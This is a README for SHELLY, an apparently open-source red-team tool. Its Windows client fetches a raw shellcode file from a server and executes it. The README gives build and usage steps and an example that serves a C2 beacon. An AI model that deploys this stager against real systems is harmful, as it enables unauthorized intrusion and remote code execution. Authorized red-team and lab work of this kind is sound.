
# 🐚 SHELLY - Serve Shellcode Over the Wire

[![Version](https://shields.io/badge/version-0.3.0--beta-orange)]()
[![Build Status](https://shields.io/badge/build-release-green)]()
[![License](https://shields.io/badge/license-MIT-blue)]()
[![Status](https://shields.io/badge/status-beta-yellow)]()

**SHELLY** is a minimal client-server utility to remotely fetch and serve raw shellcode files over the network.

- `shelly-server`: Listens for incoming client requests and sends raw shellcode files on demand.
- `shelly.exe`: A Windows-compatible client (built with MinGW-w64) that requests a specified shellcode file from the server.

---

## 🛠️ Tech Stack

![C++](https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white) ![MinGW-w64](https://img.shields.io/badge/MinGW--w64-000000?style=for-the-badge&logo=gnubash&logoColor=white) ![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white) ![Make](https://img.shields.io/badge/Make-064F8C?style=for-the-badge&logo=gnu&logoColor=white) ![WinINet](https://img.shields.io/badge/WinINet-0078D7?style=for-the-badge&logo=windows&logoColor=white) ![Shell](https://img.shields.io/badge/Shell-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)


## 📦 Project Structure

```
SHELLY/
├── src/
│   └── shelly.cpp         # Client source (edit before build)
│   └── shelly-server.py   # Server source
├── shelly-server          # Shellcode server (built locally)
├── bin/
│   └── shelly.exe         # Windows client binary (built with MinGW-w64)
├── Makefile
└── README.md
```

---

## ⚙️ Requirements

- **Linux** system with:
  - `make`
  - `x86_64-w64-mingw32-g++` (MinGW-w64 for cross-compilation)

---

## 🔧 Setup & Usage

### 1. Edit Client Configuration

Before building `shelly.exe`, you must **edit the following** in `src/shelly.cpp`:

- `SERVER_IP`: The IP address of the host running `shelly-server`
- `REMOTE_FILE`: The name of the shellcode file to request from the server

```cpp
// Example inside src/shelly.cpp
#define SERVER_IP "192.168.1.10"
#define REMOTE_FILE "payload.bin"
```

---

### 2. Build the Project

```bash
make         # General Instructions before using 'make build'
make build   # Cross-compiles src/shelly.cpp into bin/shelly.exe and creates a bash script for calling 'src/shelly-server.py'
```

The resulting Windows binary will be located at `bin/shelly.exe`.

---

### 3. Start the Server

Start the server on the machine that holds your shellcode files:

```bash
./shelly-server
```

- The server looks for requested files in its **current working directory**.
- Example: if `REMOTE_FILE` is `"payload.bin"`, place `payload.bin` in the same directory as `shelly-server`.

---

### 4. Run the Client (on Windows)

On the Windows target, run:

```cmd
shelly.exe
```

This will:

- Connect to `SERVER_IP`
- Request `REMOTE_FILE`
- Receive and execute the raw shellcode.

---

## ❗ Important Notes

- Intended for **controlled environments** (e.g., red team labs or internal C2-like testing).
- Always verify legality and authorization before use in real-world networks.

---

## ✅ Example Workflow

1. Place `beacon.bin` in the same folder as `shelly-server`
2. Set `REMOTE_FILE` to `"beacon.bin"` in `src/shelly.cpp`
3. Set `SERVER_IP` to your Linux host's IP
4. Build with `make && make build`
5. Start the server
6. Run `bin/shelly.exe` on the client

---

## 🛠️ Troubleshooting

- If you see linker errors like `__gxx_personality_sj0` or `_Unwind_SjLj_*`, ensure you’re compiling with `x86_64-w64-mingw32-g++`, not `gcc`.

---

## 📜 License

MIT or similar open-source license. Use responsibly.
